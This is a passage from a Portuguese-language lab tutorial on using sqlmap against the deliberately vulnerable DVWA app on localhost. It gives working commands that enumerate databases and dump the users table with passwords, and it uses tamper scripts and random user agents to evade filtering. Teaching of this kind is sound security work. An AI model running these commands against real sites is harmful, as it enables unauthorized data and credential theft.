...
## Usando **sqlmap** contra o DVWA

### 1 Pegando os **cookies** (sessão e nível de segurança)

Faça login no DVWA (admin/password). No navegador, abra **DevTools → Application/Storage → Cookies** e copie algo como:

```
PHPSESSID=abcdef123456...; security=low
```

> Você precisa incluir **PHPSESSID** e **security=low/medium/high** nas requisições do sqlmap para reproduzir seu contexto de sessão e nível.

### 2 SQL Injection (GET clássico)

No módulo **SQL Injection**, ao submeter `id=1`, copie a URL base (geralmente algo como):
...
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" \
  -p id --dbms=mysql --batch
```

* `-p id` foca no parâmetro certo.
* `--dbms=mysql` acelera o fingerprint (opcional).
* `--batch` responde prompts automaticamente.
...
# Listar bancos
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" -p id --dbs

# Listar tabelas do banco 'dvwa'
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" -p id -D dvwa --tables

# Colunas de 'users'
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" -p id -D dvwa -T users --columns

# Dump seletivo
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" -p id -D dvwa -T users -C user_id,first_name,last_name,user,password --dump
```

### 3 Blind SQLi (time/boolean)

No módulo **Blind SQL Injection**:

```bash
# Testes mais profundos e time-based
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=low" \
  -p id --technique=BT --level=5 --risk=2 --time-sec=5 --batch
```

* `--technique=BT`: força **Boolean** e **Time**.
* `--time-sec=5`: janela de atraso para time-based.

### 4 Quando há **CSRF token** ou fluxo complexo

1. Intercepte a requisição real com **Burp/ZAP** (inclui cookies, headers e o corpo correto).
2. Salve em arquivo `req.txt`.
3. Rode:
...
> Esta é a forma mais robusta quando há token/headers dinâmicos.

---

### Aumentando a dificuldade (Medium/High)

* Mude em **DVWA Security** para **Medium** ou **High** e repita os testes.
* Em níveis mais altos, o DVWA adiciona validações, prepara *queries* etc.
* No **sqlmap**, experimente:

  * subir `--level` e `--risk`,
  * ajustar `--technique` (ex.: `--technique=BEUST`),
  * usar `--tamper` para *bypass* simples,
  * `--identify-waf` (didático; DVWA normalmente não tem WAF real).

Exemplo “mais agressivo” (use com cuidado, mesmo no lab):

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=SEU_ID; security=high" \
  -p id --level=5 --risk=2 --threads=5 --random-agent \
  --technique=BEUST --identify-waf --tamper=space2comment,randomcase --batch
```
...
* **Nada detectado no Medium/High?** Use `-r req.txt` do Burp, aumente `--level`, `--risk`, teste `--technique=BT`, suba `--time-sec`.
* **Sessão expira?** Refaça login, atualize o cookie no comando, ou capture de novo com Burp.
* **Resultados inconsistentes?** Use `--flush-session` para limpar cache do sqlmap.
* **DVWA não cria DB?** Verifique permissões no MariaDB e `config.inc.php`.
* **Porta diferente?** Ajuste `-p` da `docker run -p HOST:80` (ex.: `-p 8080:80` → URL vira `http://localhost:8080/`).
